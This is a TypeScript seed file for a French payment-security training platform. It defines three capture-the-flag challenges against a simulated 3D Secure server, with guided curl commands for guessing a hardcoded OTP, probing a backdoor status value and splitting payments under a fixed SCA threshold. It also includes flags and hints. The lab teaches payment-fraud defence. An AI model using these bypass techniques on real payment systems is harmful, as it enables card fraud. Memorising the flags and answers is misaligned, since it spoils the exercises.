import type { CtfChallengeSeed } from '../ctfChallenges';

export const THREEDS_CHALLENGES: CtfChallengeSeed[] = [
    {
        code: '3DS-001',
        title: 'Le Numero Magique',
        description: 'L OTP 3D Secure est hardcode. Un code statique valide toutes les authentifications — bypass total de l authentification forte.',
        freeModeDescription: 'Testez le flow 3DS. L OTP attendu n est pas aleatoire. Trouvez le code qui passe a chaque fois.',
        category: '3DS_BYPASS',
        difficulty: 'BEGINNER',
        points: 100,
        flagValue: 'PMP{3DS_STATIC_OTP}',
        targetService: 'sim-acs',
        targetEndpoint: 'POST http://acs-simulator:8013/acs/verify-otp',
        vulnerabilityType: 'Static OTP',
        attackVector: 'Hardcoded credential',
        learningObjectives: ['Comprendre le flow 3D Secure', 'Identifier un OTP statique', 'Evaluer l impact sur l authentification forte (SCA)'],
        estimatedMinutes: 15,
        isActive: true,
        relatedWorkshopPath: '/student/theory/3ds-flow',
        guidedSteps: [
            { stepNumber: 1, stepTitle: 'Initiation du flow 3DS', stepDescription: 'Initiez un challenge 3DS pour une transaction test. Le serveur ACS renvoie un formulaire d authentification.', stepType: 'CURL_COMMAND', commandTemplate: 'curl -s -X POST http://acs-simulator:8013/acs/challenge -H "Content-Type: application/json" -d "{\\"pan\\":\\"4111111111111111\\",\\"amount\\":500,\\"currency\\":\\"EUR\\",\\"merchantName\\":\\"TestShop\\"}" | jq .', expectedOutput: 'challengeId et formulaire demandant un OTP' },
            { stepNumber: 2, stepTitle: 'Tentative OTP aleatoire', stepDescription: 'Essayez un OTP au hasard pour confirmer que la verification fonctionne.', stepType: 'CURL_COMMAND', commandTemplate: 'curl -s -X POST http://acs-simulator:8013/acs/verify-otp -H "Content-Type: application/json" -d "{\\"challengeId\\":\\"test\\",\\"otp\\":\\"999999\\"}" | jq .', expectedOutput: 'status: FAILED — l OTP est incorrect' },
            { stepNumber: 3, stepTitle: 'Enumeration systematique', stepDescription: 'Automatisez le test de codes OTP avec une boucle. Les implementations faibles acceptent des valeurs previsibles ou repetitives. Ecrivez un script qui teste plusieurs codes en sequence et observe les reponses.', stepType: 'CURL_COMMAND', commandTemplate: 'for otp in 000000 111111 123456 654321 999999 112233; do echo -n "OTP $otp: "; curl -s -X POST http://acs-simulator:8013/acs/verify-otp -H "Content-Type: application/json" -d "{\\"challengeId\\":\\"test\\",\\"otp\\":\\"$otp\\"}" | jq -r .status; done', expectedOutput: 'Un des codes retourne SUCCESS — c est l OTP hardcode' },
            { stepNumber: 4, stepTitle: 'Confirmation du bypass', stepDescription: 'Utilisez l OTP statique decouvert sur une autre transaction. Il fonctionne a chaque fois.', stepType: 'CURL_COMMAND', commandTemplate: 'curl -s -X POST http://acs-simulator:8013/acs/verify-otp -H "Content-Type: application/json" -d "{\\"challengeId\\":\\"new_tx\\",\\"otp\\":\\"123456\\"}" | jq .status', expectedOutput: 'SUCCESS — meme OTP pour toutes les transactions' },
            { stepNumber: 5, stepTitle: 'Impact SCA DSP2', stepDescription: 'Un OTP statique viole l exigence DSP2 d authentification forte. Un attaquant avec un PAN vole peut valider n importe quelle transaction.', stepType: 'ANALYSIS' },
            { stepNumber: 6, stepTitle: 'Capture du flag', stepDescription: 'Le flag decrit un OTP 3DS statique.', stepType: 'EXPLOITATION' },
        ],
        hints: [
            { hintNumber: 1, hintText: 'Categorie : Authentification faible (OWASP A07). Le code OTP utilise un secret statique au lieu d un generateur aleatoire.', costPoints: 5 },
            { hintNumber: 2, hintText: 'Outils : curl avec boucle bash ou script Python. Automatisez le test de codes OTP — une valeur previsible est acceptee pour toutes les transactions.', costPoints: 12 },
            { hintNumber: 3, hintText: 'Le flag se trouve dans la reponse JSON apres validation reussie. Soumettez un OTP valide en incluant votre identifiant etudiant dans le header x-student-id.', costPoints: 25 },
        ],
    },
    {
        code: '3DS-002',
        title: 'Le Mot de Passe',
        description: 'Une valeur magique dans le champ d authentification bypasse toute la logique de verification 3DS — une backdoor de developpement laissee en production.',
        freeModeDescription: 'Certaines valeurs speciales dans les champs 3DS court-circuitent la verification. Trouvez le mot magique.',
        category: '3DS_BYPASS',
        difficulty: 'INTERMEDIATE',
        points: 150,
        flagValue: 'PMP{3DS_BACKDOOR_SUCCESS}',
        prerequisiteChallengeCode: '3DS-001',
        targetService: 'sim-acs',
        targetEndpoint: 'POST http://acs-simulator:8013/acs/authenticate',
        vulnerabilityType: 'Logic bypass',
        attackVector: 'Magic value injection',
        learningObjectives: ['Identifier une backdoor logique', 'Comprendre les risques du code de debug en production', 'Detecter les conditions de contournement'],
        estimatedMinutes: 20,
        isActive: true,
        relatedWorkshopPath: '/student/theory/3ds-flow',
        guidedSteps: [
            { stepNumber: 1, stepTitle: 'Analyse du flow normal', stepDescription: 'Observez le processus d authentification 3DS standard et identifiez les champs acceptes.', stepType: 'CURL_COMMAND', commandTemplate: 'curl -s -X POST http://acs-simulator:8013/acs/authenticate -H "Content-Type: application/json" -d "{\\"pan\\":\\"4111111111111111\\",\\"transStatus\\":\\"C\\",\\"amount\\":500}" | jq .', expectedOutput: 'Challenge required — le flow normal demande une verification' },
            { stepNumber: 2, stepTitle: 'Test de valeurs speciales', stepDescription: 'Testez des valeurs non conformes dans les champs du message d authentification. Les backdoors de developpement laissees en production reagissent souvent a des mots-cles speciaux injectes dans les champs de statut ou de configuration.', stepType: 'CURL_COMMAND', commandTemplate: 'for val in SUCCESS TEST DEBUG BYPASS Y APPROVED; do echo -n "transStatus=$val: "; curl -s -X POST http://acs-simulator:8013/acs/authenticate -H "Content-Type: application/json" -d "{\\"pan\\":\\"4111111111111111\\",\\"transStatus\\":\\"$val\\",\\"amount\\":500}" | jq -r .authResult; done', expectedOutput: 'Une valeur retourne "SUCCESS" sans challenge — c est la backdoor' },
            { stepNumber: 3, stepTitle: 'Exploitation de la backdoor', stepDescription: 'Utilisez la valeur magique pour approuver une transaction sans authentification.', stepType: 'CURL_COMMAND', commandTemplate: 'curl -s -X POST http://acs-simulator:8013/acs/authenticate -H "Content-Type: application/json" -d "{\\"pan\\":\\"4111111111111111\\",\\"transStatus\\":\\"SUCCESS\\",\\"amount\\":9999}" | jq .', expectedOutput: 'authResult: SUCCESS pour 9999 EUR sans aucun challenge' },
            { stepNumber: 4, stepTitle: 'Code source review', stepDescription: 'Verifiez dans le code source que la condition backdoor est une simple comparaison string.', stepType: 'CODE_SNIPPET', hintText: 'Cherchez "SUCCESS" ou "BYPASS" dans le code du service ACS.' },
            { stepNumber: 5, stepTitle: 'Impact', stepDescription: 'Un fraudeur qui connait ce mot clé peut approuver n importe quelle transaction sans SCA. Violation DSP2 + fraude illimitee.', stepType: 'ANALYSIS' },
            { stepNumber: 6, stepTitle: 'Capture du flag', stepDescription: 'Backdoor 3DS via valeur magic.', stepType: 'EXPLOITATION' },
        ],
        hints: [
            { hintNumber: 1, hintText: 'Categorie : Logique de contournement (OWASP A01). Une backdoor de developpement est restee active en production — un champ du message d authentification n est pas correctement valide.', costPoints: 5 },
            { hintNumber: 2, hintText: 'Outils : curl. Enumerez les valeurs possibles d un champ de statut dans le corps de la requete — les conditions de bypass reagissent souvent a des mots-cles en majuscules ou des etats invalides.', costPoints: 12 },
            { hintNumber: 3, hintText: 'Le flag se trouve dans la reponse JSON apres bypass reussi. Incluez votre identifiant etudiant via le header x-student-id pour recevoir un flag personnalise.', costPoints: 25 },
        ],
    },
    {
        code: '3DS-003',
        title: 'Juste en Dessous',
        description: 'Le seuil SCA est un montant statique unique. Les transactions juste en dessous (ex: 499.99 EUR) ne declenchent jamais de challenge 3DS.',
        freeModeDescription: 'Identifiez le seuil exact de declenchement SCA et contournez-le en fractionnant ou ajustant les montants.',
        category: '3DS_BYPASS',
        difficulty: 'INTERMEDIATE',
        points: 200,
        flagValue: 'PMP{SCA_THRESHOLD_BYPASS}',
        prerequisiteChallengeCode: '3DS-002',
        targetService: 'sim-acs',
        targetEndpoint: 'POST http://acs-simulator:8013/acs/risk-check',
        vulnerabilityType: 'Static SCA threshold',
        attackVector: 'Sub-threshold transaction splitting',
        learningObjectives: ['Comprendre les exemptions SCA de la DSP2', 'Identifier un seuil statique exploitable', 'Proposer des controles de velocite cumulatifs'],
        estimatedMinutes: 25,
        isActive: true,
        relatedWorkshopPath: '/student/theory/3ds-flow',
        guidedSteps: [
            { stepNumber: 1, stepTitle: 'Detection du seuil', stepDescription: 'Envoyez des transactions de montants croissants pour trouver le seuil de declenchement SCA.', stepType: 'CURL_COMMAND', commandTemplate: 'for amt in 100 200 300 400 450 490 499 500 501; do echo -n "Amount $amt: "; curl -s -X POST http://acs-simulator:8013/acs/risk-check -H "Content-Type: application/json" -d "{\\"pan\\":\\"4111111111111111\\",\\"amount\\":$amt}" | jq -r .scaRequired; done', expectedOutput: 'false sous 500, true a 500+ — seuil = 500 EUR' },
            { stepNumber: 2, stepTitle: 'Contournement a 499.99', stepDescription: 'Envoyez une transaction a 499.99 EUR. Elle passe sans SCA.', stepType: 'CURL_COMMAND', commandTemplate: 'curl -s -X POST http://acs-simulator:8013/acs/risk-check -H "Content-Type: application/json" -d "{\\"pan\\":\\"4111111111111111\\",\\"amount\\":499.99}" | jq .', expectedOutput: 'scaRequired: false — pas de challenge pour 499.99 EUR' },
            { stepNumber: 3, stepTitle: 'Split payment attack', stepDescription: 'Fractionnez un achat de 1500 EUR en 3 transactions de 499.99 EUR. Chacune passe sous le seuil.', stepType: 'CURL_COMMAND', commandTemplate: 'for i in 1 2 3; do echo "=== Split TX $i ==="; curl -s -X POST http://sim-network-switch:8004/transaction/authorize -H "Content-Type: application/json" -d "{\\"pan\\":\\"4111111111111111\\",\\"amount\\":499.99,\\"currency\\":\\"978\\",\\"merchantId\\":\\"SHOP00$i\\"}" | jq .responseCode; done', expectedOutput: 'Toutes approuvees sans SCA — 1500 EUR debites sans authentification' },
            { stepNumber: 4, stepTitle: 'Absence de cumul', stepDescription: 'Le systeme ne cumule pas les montants. 3x499.99 = 1499.97 EUR sans aucun challenge. Il manque une logique de velocite par montant cumule.', stepType: 'ANALYSIS' },
            { stepNumber: 5, stepTitle: 'Remediation DSP2', stepDescription: 'La DSP2 prevoit des exemptions (TRA, low value) mais exige un cumul : max 5 TX ou 150 EUR cumules sans SCA. Ce seuil statique unique est non conforme.', stepType: 'EXPLANATION' },
            { stepNumber: 6, stepTitle: 'Capture du flag', stepDescription: 'Contournement du seuil SCA.', stepType: 'EXPLOITATION' },
        ],
        hints: [
            { hintNumber: 1, hintText: 'Testez des montants proches de 500 EUR (499, 499.99, 500, 501). Le seuil est statique.', costPoints: 5 },
            { hintNumber: 2, hintText: '499.99 EUR ne declenche jamais de SCA. Vous pouvez fractionner n importe quel montant.', costPoints: 10 },
            { hintNumber: 3, hintText: 'Le flag suit le format PMP{...}. Validez votre exploitation pour le recuperer.', costPoints: 25 },
        ],
    },
];

